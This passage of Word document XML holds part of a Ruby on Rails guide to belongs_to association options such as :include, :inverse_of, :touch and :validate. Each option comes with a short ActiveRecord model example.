              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B7568F2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62480C57" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :line_items</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="010E4C56" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C9333D8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5638AC93" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57417734" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0586E85A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5D0DD71F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you frequently retrieve customers directly from line items (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@line_item.order.customer</w:t>
      </w:r>
      <w:r>
        <w:t>), then you can make your code somewhat more efficient by including customers in the association from line items to orders:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5424"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="318FF742" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7702B991" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LineItem &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E95F2CD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :order, :include</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19907785" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5645E303" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5222BEAF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19FA1C30" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B182465" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :line_items</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5839110E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2050222D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D3BD4E4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B62FFAD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FF7694F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7B0D669B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There’s no need to use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for immediate associations – that is, if you have </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Order belongs_to :customer</w:t>
      </w:r>
      <w:r>
        <w:t>, then the customer is eager-loaded automatically when it’s needed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C263B06" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inverse_of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B3329D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inverse_of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies the name of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association that is the inverse of this association. Does not work in combination with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:polymorphic</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5904"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="0F54A79B" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02A99E49" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="402A03B4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders, :inverse_of</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26DCD82D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="015E0148" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E63CCD9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25B66253" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer, :inverse_of</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60E6BFB0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3DAEAD3D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:polymorphic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7138E562" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Passing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:polymorphic</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option indicates that this is a polymorphic association. Polymorphic associations were discussed in detail </w:t>
      </w:r>
      <w:hyperlink r:id="rId213" w:anchor="polymorphic-associations" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>earlier in this guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC4D3D8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FFFC708" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>, then the associated object will be read-only when retrieved via the association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22835546" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236B3054" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you override the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause that is used to retrieve data about the associated object. By default, Rails retrieves all columns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6229CE72" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option on a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association, you should also set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>foreign_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to guarantee the correct results.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E1D3A3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:touch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A810775" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:touch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>updated_at</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>updated_on</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> timestamp on the associated object will be set to the current time whenever this object is saved or destroyed:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4944"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="0E445C6F" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1307D512" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E85C48B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer, :touch</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CD1DA64" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79B41C9F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DBAE7FE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5662A1DC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20E863AB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6F9AC279" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In this case, saving or destroying an order will update the timestamp on the associated customer. You can also specify a particular timestamp attribute to update:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6624"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="03B3FE47" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F2385FC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30D7C8EC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer, :touch</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :orders_updated_at</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6143DE4C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B2E9627" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35431E06" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then associated objects will be validated whenever you save this object. By default, this is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t>: associated objects will not be validated when this object is saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE3AD6F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.3 Do Any Associated Objects Exist?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8172B0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can see if any associated objects exist by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.nil?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
